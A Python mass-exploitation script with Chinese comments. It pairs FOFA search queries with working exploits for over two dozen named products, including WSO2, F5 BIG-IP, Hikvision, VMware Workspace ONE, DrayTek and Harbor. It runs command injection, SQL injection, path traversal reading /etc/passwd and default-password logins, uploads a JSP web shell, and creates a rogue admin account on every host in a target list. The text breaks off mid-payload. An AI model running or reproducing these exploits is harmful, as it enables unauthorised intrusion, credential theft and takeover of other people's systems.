import base64
import datetime
import json
import re
import requests

requests.packages.urllib3.disable_warnings()

headers = {
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cache-Control":"max-age=0",
        "Connection":"keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.190.400 QQBrowser/11.5.5240.400"}

# 1、x-ui面板爬虫爬取及登陆分享   fofa: (port=54321 || port=65432) && (port="65432" || port="54321") && status_code="200" && (title="登录" || title="Login")
def x_ui_board_login(dic):
    payload = "/login" 
    payload_data = {"username": "admin", "password": "admin"}

    for url_list in dic:
        if('http://' in url_list) or ('https://' in url_list):
            url_list = url_list + payload
        else:
            url_list = 'http://' + url_list + payload
        try:
            result = requests.post(url_list,headers=headers,data=payload_data,verify=False,timeout=5).json()
            if ('true' in str(result['success'])) or ('True' in str(result['success'])):
                with open('存在x-ui面板弱口令登录的url.txt','a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url_list)
                    f.write(url_list + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + url_list)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 2、金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞 fofa：app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"
def jinide_oa_server_file_directory_traversal(dic):

    payload = "/action/usermanager.htm" 

    for url_list in dic:
        if('http://' in url_list) or ('https://' in url_list):
            url_list = url_list + payload
        else:
            url_list = 'http://' + url_list + payload
        try:
            result = requests.get(url_list,headers=headers,verify=False,timeout=5).json()
            if ('1' in str(result["state"])):
                with open('存在金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞的url.txt','a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url_list)
                    f.write(url_list + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + url_list)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 3、网康下一代防火墙 getshell fofa：app="网康科技-下一代防火墙"
def wangkang_fanghuoqiang_getshell(dic):
    headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4388.124 Safari/527.36',
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 ",
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Content-Length': '19443'
        }  

    payload = "/directdata/direct/router" 
    poc = "o9isu852j.txt"
    payload_data = """ {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo 'o9isu852j' >/var/www/html/o9isu852j.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="} """

    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            pass
        else:
            url_list = 'http://'+url_list
        try:
            r_res = requests.post(url_list+'/'+payload, data=payload_data, headers=headers,verify=False,timeout=5)
            r_exp = requests.get(url_list+'/'+poc,headers=headers,verify=False,timeout=5)
            if "o9isu852j" in r_exp.text:
                with open('存在网康下一代防火墙 getshell的url.txt','a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url_list)
                    f.write(url_list + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + url_list)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 4、存在Apache Hadoop Yarn RPC 远程命令执行漏洞 fofa:app="APACHE-hadoop-YARN"
def Apache_Hadoop_Yarn_RPC_RCE_exp(dic):
    poc = r"""/ws/v1/cluster/apps"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url1 = url_list + poc
        else:
            url1 = 'http://'+ url_list + poc
        newurl = url1.split('//')[1].split('/')[0]
        if ":" not in str(newurl):
            pass
        else:
            host = newurl.split(':')[0]
            port = newurl.split(':')[1]
            headers = {
                "host": f'{host}:{port}',
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Content-Length": "167",
                "Content-Type": "application/json",
                "User-Agent": "Serein v2.7"
            }
            data = {"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"}
            proxies = {
                "http": "http://127.0.0.1:7890",
                "https": "https://127.0.0.1:7890"
            }
            try:
                res = requests.post(url1, headers=headers,proxies=proxies,json=data,verify=False,timeout=3)
                if "groups=" in res.text:
                    with open ("存在Apache Hadoop Yarn RPC 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url1)
                        f.write(url1 + "\n")
                        f.close()
                else:
                    print("[-]---------下一个更精彩：" + url1)
            except Exception as err:
                print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 5、Apache Spark 远程命令执行漏洞(CVE-2022-33891)一把梭 fofa:app="APACHE-Spark-Jobs"
def apache_spark_cve_2022_33891_exp(dic):
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            targeturl = f'{url_list}/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`'
        else:
            url_list = 'http://' + url_list
            targeturl = f'{url_list}/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`'
        try:
            t1 = datetime.datetime.now()        
            res = requests.post(url=targeturl, verify=False, timeout=20, allow_redirects=False)
            t2 = datetime.datetime.now()
            delta = t2 - t1
            if delta.seconds < 10:
                print("[-]---------下一个更精彩：" + targeturl)
            else:
                with open ("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)一把梭的url.txt", 'a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + targeturl)
                    f.write(targeturl + "\n")
                    f.close()
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 6、ClickHouse API 数据库接口未授权访问漏洞 fofa:"ClickHouse" && body="ok"
def clickhouse_unauthorized_visit_exp(dic):
    poc = r"""/?query=show%20status"""
    headers = {
        "Upgrade-Insecure-Requests":"1",
        "x-forwarded-for":"127.0.0.1",
        "x-originating-ip":"127.0.0.1",
        "x-remote-ip":"127.0.0.1",
        "x-remote-addr":"127.0.0.1"
    }
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, headers=headers,verify=False,timeout=3)
            if "Aborted_clients" in res.text:
                with open ("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)一把梭的url.txt", 'a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                    f.write(url + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 7、D-Link DCS系列监控 账号密码信息泄露漏洞(CVE_2020_25078)
def dcs_admin_passwd_leak_exp(dic):
    poc = r"""/config/getuser?index=0"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3,allow_redirects=False)
            if "pass=" in res.text and res.status_code == 200:
                with open ("存在D-Link DCS系列监控 账号密码信息泄露漏洞的url.txt", 'a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                    f.write(url + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 8、DrayTek企业网络设备远程命令执行漏洞(CVE_2022_8515)
def vigor_rce_exp(dic):
    poc = "/cgi-bin/mainfunction.cgi"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            }
    data = "action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            vuln_url = url_list + poc
        else:
            vuln_url = 'http://'+ url_list + poc
        try:
            response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
            if "root" in response.text and response.status_code == 200:
                with open ("存在DrayTek企业网络设备远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + vuln_url)
                    f.write(vuln_url + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + vuln_url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 9、VMware服务端模板注入漏洞(CVE-2022-22954)一把梭 fofa:app="vmware-Workspace-ONE-Access" || app="vmware-Identity-Manager"
def vmware_one_access_ssti_exp(dic):
    poc = r"""/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3)
            if "root" in res.text:
                with open ("存在VMware服务端模板注入漏洞(CVE-2022-22954)【注意：验证该漏洞时请关注您网页F12下的控制台输出内容！】的url.txt", 'a+',encoding='utf-8') as f:
                    print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                    f.write(url + "\n")
                    f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 10、DedeCMS v5.7.87 SQL注入漏洞(CVE-2022-23337)一把梭
def dede_sql_exp(dic):
    poc = r"""/dede/article_coonepage_rule.php?action=del&ids=2,1)%20or%20sleep(3)%23"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, timeout=3)
            if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
                with open ("存在DedeCMS v5.7.87 SQL注入漏洞(CVE-2022-23337)的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 11、WSO2远程命令执行漏洞(CVE-2022-29464)一把梭 fofa:title="WSO2 Management Console"
def CVE_2022_29464_exp(dic):
    shell= '''
<%@ page import="java.util.*,java.io.*"%>

<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>
'''
    public_key = '''KEY'''
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            pass
        else:
            url = 'http://'+url_list
        try:
            resp = requests.post(f"{url}/fileupload/toolsAny", timeout=3, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira": public_key})
            resp = requests.post(f"{url}/fileupload/toolsAny", timeout=3, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira.jsp": shell})
            if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
                with open ("存在WSO2远程命令执行漏洞(CVE-2022-29464)的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 12、D-LINK DAP-2020 webproc 任意文件读取漏洞(CVE-2021-27250)一把梭 fofa：(body="login_box_sonicwall" || header="SonicWALL SSL-VPN Web Server") && body="SSL-VPN"
def Dap_2020_anyfile_read_cve_2021_27250_exp(dic):
    poc = r"""/cgi-bin/webproc"""
    data = r"""getpage=html%2Findex.html&errorpage=/etc/passwd&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=123&%3Aaction=login&%3Asessionid=3c1f7123"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, verify=False,data=data,timeout=3)
            if "root" in res.text:
                with open ("存在D-LINK DAP-2020 webproc 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 13、DocCMS keyword SQL注入漏洞一把梭 fofa:app="Doccms"
def doccms_keyword_sql_exp(dic):
    poc = r"""/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "@localhost" in res.text:
                with open ("存在DocCMS keyword SQL注入漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 14、DVR 登录绕过漏洞(CVE-2018-9995)一把梭
def dvr_login_bypass_exp(dic):
    poc = r"""/device.rsp?opt=user&cmd=list"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            resp = requests.get(url,headers={"Cookie": "uid=admin"},verify=False,timeout=3)
            res = json.loads((resp.text).encode("utf-8"))
            account = res['list'][0]['uid']
            password = res['list'][0]['pwd']
            if password != "" and "*" not in password:
                with open ("存在DVR 登录绕过漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "；获取到账号【" + str(account) + "】、密码【" + str(password) + "】\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 15、泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞一把梭 fofa:app="泛微-E-Weaver"
def E_Weaver_any_file_read_exp(dic):
    poc = r"""/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "ecology.user" in res.text:
                with open ("存在泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 16、F5 BIG-IP 远程代码执行漏洞一把梭 fofa:"VoIPmonitor"
def f5_big_ip_exp(dic):
    poc = r"""/mgmt/tm/util/bash"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            newurl = url.split('//')[1].split('/')[0]
            if ":" not in str(newurl):
                pass
            elif "[" in str(newurl):
                pass
            else:
                host = newurl.split(':')[0]
                port = newurl.split(':')[1]
                headers = {
                    "Host":f'{host}:{port}',
                    "Connection": "close",
                    "Cache-Control": "max-age=0",
                    "Authorization": "Basic YWRtaW46QVNhc1M=",
                    "X-F5-Auth-Token":"",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/json"
                }
                data = '{"command":"run","utilCmdArgs":"-c id"}'
                res = requests.post(url, headers=headers, data=data, verify=False, timeout=3)
                if "uid" in res.text:
                    commandResult = json.loads(res.text)["commandResult"]
                    with open ("存在F5 BIG-IP 远程代码执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url + "；返回内容为：" + str(commandResult) + "---------------------------------\n")
                        f.write(url + "\n")
                        f.close()
                else:
                    print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 17、Fikker 管理平台弱口令漏洞一把梭 fofa:"Fikker管理平台"
def fikker_weak_password_exp(dic):
    poc = r"""/fikker/webcache.fik?type=sign&cmd=in"""
    headers = {
        "Referer": "http://www.baidu.com/"
    }
    data = r"RequestID=LOGIN&Username=admin&Password=123456"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, headers=headers,data=data,verify=False,timeout=3)
            if "True" in res.text:
                with open ("存在Fikker 管理平台弱口令漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 18、Fortinet任意文件读取漏洞(CVE-2018-13379)一把梭
def Fortigate_CVE_2018_13379_exp(dic):
    poc = r"""/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,stream=True,timeout=3)
            if "var fgt_lang = " in res.text:
                with open ("存在Fikker 管理平台弱口令漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 19、Franklin Fueling Systems任意文件读取漏洞(CVE-2021-46417)一把梭 fofa:"Franklin Fueling Systems"
def Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_exp(dic):
    poc = r"""/cgi-bin/tsaupload.cgi?file_name=../../../../../../etc/passwd&password="""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "root" in res.text:
                with open ("存在Franklin Fueling Systems任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 20、孚盟云 AjaxMethod.ashx SQL注入漏洞一把梭 fofa:title="孚盟云 "
def fumengyun_sql_exp(dic):
    poc = r"""/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3)
            if "字符串 'Y'' 后的引号不完整。" in res.text:
                with open ("存在孚盟云 AjaxMethod.ashx SQL注入漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 21、泛微OA E-Office UserSelect 未授权访问漏洞 一键检测 fofa:app="泛微-E-Weaver"
def FW_Eoffice(dic):
    poc = r"""/UserSelect/"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "选择人员" in res.text:
                with open ("存在泛微OA E-Office UserSelect 未授权访问漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 22、Harbor 未授权创建管理员漏洞一把梭 fofa:title="Harbor"
def harbor_admin_weishouquan_exp(dic):
    poc = r"""/api/user"""
    data = base64.b64decode("JTdCJTIydXNlcm5hbWUlMjIlM0ElMjJtdWhhbiUyMiUyQyUyMmVtYWlsJTIyJTNBJTIyeHh4eHh4QHFxLmNvbSUyMiUyQyUyMnJlYWxuYW1lJTIyJTNBJTIybXVoYW4lMjIlMkMlMjJwYXNzd29yZCUyMiUzQSUyMm11aGFuJTIyJTJDJTIyY29tbWVudCUyMiUzQSUyMjElMjIlMkMlMjJoYXNfYWRtaW5fcm9sZSUyMiUzQXRydWUlN0Q=")
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            resp = requests.post(url=url, data=data, headers=headers, verify=False, timeout=5)
            if resp.status_code == 201:
                with open ("存在Harbor 未授权创建管理员漏洞一把梭的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url + "；成功创建账号:muhan 密码:muhan" + "-------------")
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 23、海康威视RCE一把梭 fofa:app="HIKVISION-视频监控"
def hkv_rce(dic):
    poc1 = "/SDK/webLanguage"
    poc2 = "/serein"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            address = url_list
        else:
            address = 'http://'+ url_list
        try:
            url1 = address + poc1
            newurl = url1.split('//')[1].split('/')[0]
            if ":" not in str(newurl):
                pass
            else:
                host = newurl.split(':')[0]
                port = newurl.split(':')[1]
                headers = {
                    "host": f'{host}:{port}',
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8'
                }
                data = r"""<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd>webLib/serein)</language>"""
                resp1 = requests.put(url1, headers=headers, data=data, timeout=3,verify=False)
                url2 = address + poc2
                resp2 = requests.get(url2,timeout=3,verify=False)
                if "root" in resp2.text:
                    with open ("存在海康威视RCE漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url2)
                        f.write(url2 + "\n")
                        f.close()
                else:
                    print("[-]---------下一个更精彩：" + url2)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 24、IceWarp WebClient远程命令执行漏洞一把梭 fofa:app="IceWarp-公司产品"
def iceWarp_webClient_rce_exp(dic):
    poc = r"""/webmail/basic/"""
    data = r"""_dlg[captcha][target]=system(\'ipconfig\')\ """
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "use_cookies=1"
    }
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, headers=headers,data=data,verify=False,timeout=3)
            if "Windows" in res.text:
                with open ("存在IceWarp WebClient远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 25、kkFileView getCorsFile 任意文件读取漏洞一把梭 fofa:body="kkFileView"
def kkFileView_readfile_CVE_2021_43734_exp(dic):
    poc = r"""/getCorsFile?urlPath=file:///etc/passwd"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3)
            if "root" in res.text:
                with open ("存在kkFileView getCorsFile 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 26、蓝凌OA treexml.tmpl 远程命令执行漏洞一把梭
def Landray_oa_treexml_rce_exp(dic):
    poc = r"""/data/sys-common/treexml.tmpl"""
    headers = {
        "Cmd":"id",
        "Sec-Fetch-Site":"none",
        "Sec-Fetch-Mode":"navigate",
        "Sec-Fetch-User":"?1",
        "Sec-Fetch-Dest":"document",
        "Pragma":"no-cache",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data = r"""s_bean=ruleFormulaValidate&script=\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0020\u0067\u0072\u006f\u0075\u0070\u0020\u003d\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0028\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0072\u0065\u0066\u006c\u0065\u0063\u0074\u002e\u0046\u0069\u0065\u006c\u0064\u0020\u0066\u0020\u003d\u0020\u0067\u0072\u006f\u0075\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0020\u003d\u0020\u0028\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0029\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0067\u0072\u006f\u0075\u0070\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u0069\u0020\u003d\u0020\u0030\u003b\u0020\u0069\u0020\u003c\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u003b\u0020\u0069\u002b\u002b\u0029\u0020\u007b\u0020\u0074\u0072\u0079\u0020\u007b\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u0020\u0074\u